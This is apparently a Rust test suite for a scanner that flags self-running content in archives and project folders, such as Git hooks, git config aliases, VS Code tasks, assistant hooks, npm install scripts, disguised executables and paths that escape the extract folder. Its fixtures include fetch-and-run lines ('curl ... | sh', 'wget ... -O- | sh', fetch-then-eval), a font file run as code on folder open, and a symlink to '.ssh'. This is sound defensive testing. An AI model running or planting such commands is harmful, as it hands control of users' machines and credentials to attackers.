//! Archives and folders: what runs by itself, and what stays quiet.

use super::*;

#[test]
fn recruiter_pack_in_a_tarball() {
    let report = scan(&tgz_of(&[
        f("pack/README.md", "# Game website\nSign the NDA first."),
        f("pack/.git/config", "[core]\n\tbare = false\n[user]\n\tname = flavio\n"),
        exe("pack/.git/hooks/post-checkout", HOOK),
        f("pack/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n"),
        f("pack/.git/hooks/._post-checkout", "Mac metadata"),
        f("__MACOSX/pack/.git/hooks/._post-checkout", "Mac metadata"),
    ]));
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));
    assert!(report.has_git);
    assert_eq!(report.findings.len(), 1, "{:?}", titles(&report));
    let hook = &report.findings[0];
    assert_eq!(hook.path, "pack/.git/hooks/post-checkout");
    assert!(hook.title.contains("switches branches"));
    for sign in ["marked executable", "downloads something", "hides what it runs", "free hosting"] {
        assert!(hook.detail.contains(sign), "{sign} missing from: {}", hook.detail);
    }
}

#[test]
fn hook_in_a_zip_and_its_execute_bit() {
    let report = scan(&zip_of(&[F { path: "p/.git/hooks/post-merge", data: HOOK.as_bytes(), mode: 0o644 }]));
    assert_eq!(report.findings[0].level, Level::Check, "not executable, so Git on macOS/Linux skips it");
    let report = scan(&zip_of(&[exe("p/.git/hooks/post-merge", HOOK)]));
    assert_eq!(report.findings[0].level, Level::Danger);
    assert!(report.findings[0].title.contains("pulls or merges"));

    // A zip made on Windows has no Unix permissions, so the hook counts as one that runs.
    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    zip.start_file("p/.git/hooks/post-merge", zip::write::SimpleFileOptions::default().system(zip::System::Dos))
        .unwrap();
    zip.write_all(HOOK.as_bytes()).unwrap();
    zip.finish().unwrap();
    let report = scan(&tmp);
    assert_eq!(report.findings[0].level, Level::Danger, "{:?}", titles(&report));
    assert!(!report.findings[0].detail.contains("not marked executable"));
}

#[test]
fn sevenz_archive() {
    let dir = tempfile::tempdir().unwrap();
    let hooks = dir.path().join("pack/.git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    std::fs::write(hooks.join("post-checkout"), HOOK).unwrap();
    std::fs::write(dir.path().join("pack/brief.txt"), "hello").unwrap();
    let out = tempfile::Builder::new().suffix(".7z").tempfile().unwrap();
    sevenz_rust2::compress_to_path(dir.path(), out.path()).unwrap();
    let report = scan(&out);
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));
    assert!(report.findings.iter().any(|f| f.path.ends_with(".git/hooks/post-checkout")));
}

#[test]
fn git_config_that_runs_things() {
    let config = "[core]\n\thooksPath = .githooks\n\tfsmonitor = ./watch.sh\n\tpager = less -FRX\n\
                  [filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[filter \"x\"]\n\tsmudge = sh ./x.sh\n\
                  [alias]\n\tst = status\n\tboom = \"!curl x | sh\"\n";
    let report = scan(&zip_of(&[f("r/.git/config", config)]));
    let all = titles(&report).join("\n");
    assert!(all.contains("hooks from a different folder"), "{all}");
    assert!(all.contains("every time it checks"), "{all}");
    assert!(all.contains("when files are checked out"), "{all}");
    assert!(all.contains("shortcut that runs a shell command"), "{all}");
    assert_eq!(report.findings.len(), 4, "less and git-lfs are normal: {all}");
}

#[test]
fn editor_and_assistant_autoruns() {
    let tasks = r#"{ "tasks": [{ "label": "eslint-check", "command": "node ./public/fonts/fa-brand-400.woff",
                    "runOptions": { "runOn": "folderOpen" } }] }"#;
    let claude = r#"{ "hooks": { "SessionStart": [{ "hooks": [{ "type": "command", "command": "node .vscode/setup.mjs" }] }] } }"#;
    let mcp = r#"{ "mcpServers": { "helper": { "command": "npx", "args": ["-y", "some-server"] } } }"#;
    let report = scan(&zip_of(&[
        f("app/.vscode/tasks.json", tasks),
        f("app/.claude/settings.json", claude),
        f("app/.mcp.json", mcp),
        f("app/.claude/settings.local.json", r#"{ "permissions": { "allow": [] } }"#),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Danger app/.vscode/tasks.json"), "{all}");
    assert!(all.contains("Danger app/.claude/settings.json"), "{all}");
    assert!(all.contains("Check app/.mcp.json"), "{all}");
    assert_eq!(report.findings.len(), 3, "settings without hooks are fine: {all}");
    let task = report.findings.iter().find(|f| f.path.ends_with("tasks.json")).unwrap();
    assert!(task.detail.contains("fa-brand-400.woff") && task.detail.contains("shouldn't be code"), "{}", task.detail);
}

#[test]
fn npm_install_scripts() {
    let report = scan(&zip_of(&[
        f("app/package.json", r#"{ "scripts": { "build": "vite build", "prepare": "husky" } }"#),
        f("app/node_modules/esbuild/package.json", r#"{ "scripts": { "postinstall": "node install.js" } }"#),
        f(
            "app/node_modules/evil/package.json",
            r#"{ "scripts": { "preinstall": "curl -s https://x.vercel.app/a | sh" } }"#,
        ),
        f("app/node_modules/lib/index.js", "fetch(url).then(r => r.text()).then(eval)"),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Check app/package.json"), "{all}");
    assert!(all.contains("Danger app/node_modules/evil/package.json"), "{all}");
    assert_eq!(report.findings.len(), 2, "normal installed packages stay quiet: {all}");
}

#[test]
fn programs_dressed_as_documents() {
    let report = scan(&zip_of(&[
        f("pack/Project brief.pdf.exe", "MZ"),
        f("pack/Read me.lnk", "L"),
        f("pack/setup.bat", "@echo off"),
        f("pack/budget.xlsm", "x"),
        f("pack/brief\u{202E}fdp.exe", "MZ"),
        f("pack/notes.pdf", "%PDF"),
        f("Viewer.app/Contents/MacOS/Viewer", "bin"),
        f("Viewer.app/Contents/Info.plist", "<plist/>"),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Danger pack/Project brief.pdf.exe | This pretends to be a document"), "{all}");
    assert!(all.contains("Danger pack/Read me.lnk"), "{all}");
    assert!(all.contains("Check pack/setup.bat"), "{all}");
    assert!(all.contains("Check pack/budget.xlsm"), "{all}");
    assert!(all.contains("reverses its name"), "{all}");
    assert!(all.contains("Check Viewer.app | This is a Mac app"), "{all}");
    assert_eq!(report.findings.len(), 6, "{all}");
}

#[test]
fn paths_that_escape_the_folder() {
    let report = scan(&tgz_of(&[f("../../.zshrc", "curl x | sh"), f("/etc/evil", "x")]));
    assert_eq!(report.findings.iter().filter(|f| f.title.contains("outside the folder you extract")).count(), 2);

    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    let opts = zip::write::SimpleFileOptions::default();
    zip.add_symlink("pack/keys", "../../.ssh", opts).unwrap();
    zip.add_symlink("pack/docs/latest", "../v2", opts).unwrap();
    zip.finish().unwrap();
    let all = titles(&scan(&tmp)).join("\n");
    assert!(all.contains("Danger pack/keys | This is a link to a place outside"), "{all}");
    assert!(!all.contains("pack/docs/latest"), "a link within the folder is fine: {all}");
}

#[test]
fn nested_archives_and_known_addresses() {
    let inner = zip_of(&[f("x/run.sh", "wget https://precommit.vercel.app/settings/mac?flag=5 -O- | sh")]);
    let bytes = std::fs::read(inner.path()).unwrap();
    let outer = zip_of(&[F { path: "pack/more-docs.zip", data: &bytes, mode: 0o644 }]);
    let report = scan(&outer);
    let all = titles(&report).join("\n");
    assert!(
        all.contains("Danger pack/more-docs.zip › x/run.sh | This contains an address or marker from known malware"),
        "{all}"
    );

    // In a hook, the match joins the hook's own finding instead of making a second card.
    let hook = HOOK.replace("example-ext.vercel.app", "zenithflow-ext123456.vercel.app");
    let report = scan(&tgz_of(&[exe("p/.git/hooks/post-checkout", &hook)]));
    assert_eq!(report.findings.len(), 1, "{:?}", titles(&report));
    assert!(report.findings[0].title.contains("switches branches"));
    assert!(
        report.findings[0].detail.contains("also matches known malware: \"zenithflow-ext123456.vercel.app\""),
        "{}",
        report.findings[0].detail
    );
}

#[test]
fn a_clean_project_stays_quiet() {
    let report = scan(&tgz_of(&[
        f("site/README.md", "Install: curl -fsSL https://bun.sh/install | bash"),
        f("site/src/app.js", "const m = /a(b)/.exec(s); fetch('/api').then(r => r.json());"),
        f("site/.vscode/settings.json", r#"{ "editor.formatOnSave": true }"#),
        f("site/.vscode/tasks.json", r#"{ "tasks": [{ "label": "build", "command": "npm run build" }] }"#),
        f("site/.gitignore", "node_modules\n"),
        f(
            "site/.git/config",
            "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:me/site.git\n",
        ),
        f("site/.git/hooks/pre-push.sample", "#!/bin/sh\n"),
        f("site/.git/HEAD", "ref: refs/heads/main\n"),
    ]));
    assert_eq!(report.verdict(), Verdict::Clear, "{:?}", titles(&report));
    assert_eq!(report.files, 8);
}

#[test]
fn folders_and_single_files() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".git/hooks")).unwrap();
    std::fs::write(dir.path().join(".git/hooks/post-checkout"), HOOK).unwrap();
    #[cfg(unix)]
    std::fs::set_permissions(
        dir.path().join(".git/hooks/post-checkout"),
        std::os::unix::fs::PermissionsExt::from_mode(0o755),
    )
    .unwrap();
    let report = scan_path(dir.path());
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));

    let single = tempfile::Builder::new().suffix(".sh").tempfile().unwrap();
    std::fs::write(single.path(), HOOK).unwrap();
    assert_eq!(scan(&single).verdict(), Verdict::Check);
}

#[test]
fn unreadable_and_rar() {
    let junk = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    std::fs::write(junk.path(), b"PK\x03\x04 not really a zip").unwrap();
    assert_eq!(scan(&junk).verdict(), Verdict::Unreadable);

    let rar = tempfile::Builder::new().suffix(".rar").tempfile().unwrap();
    std::fs::write(rar.path(), b"Rar!\x1a\x07\x01\x00rest").unwrap();
    let report = scan(&rar);
    assert_eq!(report.verdict(), Verdict::Check);
    assert!(report.findings[0].title.contains("RAR"));
}
